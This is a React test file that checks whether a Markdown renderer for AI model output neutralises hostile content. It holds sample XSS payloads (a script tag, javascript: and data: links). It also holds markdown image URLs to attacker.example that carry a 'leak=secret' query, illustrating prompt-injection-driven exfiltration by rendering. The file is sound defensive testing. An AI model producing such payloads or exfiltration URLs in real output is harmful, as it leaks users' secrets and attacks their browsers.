import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { Markdown } from "../components/segments/Markdown";

/**
 * Model output is untrusted input.
 *
 * It arrives from a harness that relays whatever the model wrote, and the model
 * has just read the user's repository, which may itself contain text planted
 * to be read. Anything the renderer does with that string is done on behalf of
 * an attacker who got a prompt injected.
 *
 * The interesting failure is not a script tag. It is the quiet one: a request
 * leaving the machine because the transcript rendered a reference to a remote
 * resource.
 */
describe("rendering untrusted model output", () => {
  it("renders embedded HTML as text, not as markup", () => {
    render(<Markdown>{'Hello <script>alert(1)</script> <b>bold</b>'}</Markdown>);
    expect(document.querySelector("script")).toBeNull();
    expect(document.querySelector("b")).toBeNull();
    expect(screen.getByTestId("markdown")).toHaveTextContent("<script>");
  });

  it("refuses a javascript: link", () => {
    render(<Markdown>{"[click me](javascript:alert(1))"}</Markdown>);
    const link = document.querySelector("a");
    expect(link?.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
  });

  it("refuses a data: link", () => {
    render(<Markdown>{"[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"}</Markdown>);
    const link = document.querySelector("a");
    expect(link?.getAttribute("href") ?? "").not.toMatch(/^data:/i);
  });

  /**
   * The exfiltration case. A model that has read something sensitive can put it
   * in a URL and have the transcript fetch it simply by being displayed: no
   * click required. Nothing in a rendered answer should reach the network.
   */
  it("never loads a remote image", () => {
    render(
      <Markdown>{"![](https://attacker.example/pixel.png?leak=secret)"}</Markdown>
    );
    const images = document.querySelectorAll("img");
    for (const image of images) {
      expect(image.getAttribute("src") ?? "").not.toMatch(/^https?:/i);
    }
  });

  it("says an image was there rather than silently dropping it", () => {
    render(<Markdown>{"![a diagram](https://example.com/d.png)"}</Markdown>);
    expect(screen.getByTestId("markdown")).toHaveTextContent(/image/i);
  });

  it("does not fetch a remote image through reference syntax either", () => {
    render(
      <Markdown>{"![alt][ref]\n\n[ref]: https://attacker.example/p.png"}</Markdown>
    );
    for (const image of document.querySelectorAll("img")) {
      expect(image.getAttribute("src") ?? "").not.toMatch(/^https?:/i);
    }
  });

  /** An ordinary link is still a link; this is not about disabling markdown. */
  it("leaves an ordinary https link alone", () => {
    render(<Markdown>{"[docs](https://example.com/guide)"}</Markdown>);
    expect(document.querySelector("a")).toHaveAttribute(
      "href",
      "https://example.com/guide"
    );
  });
});
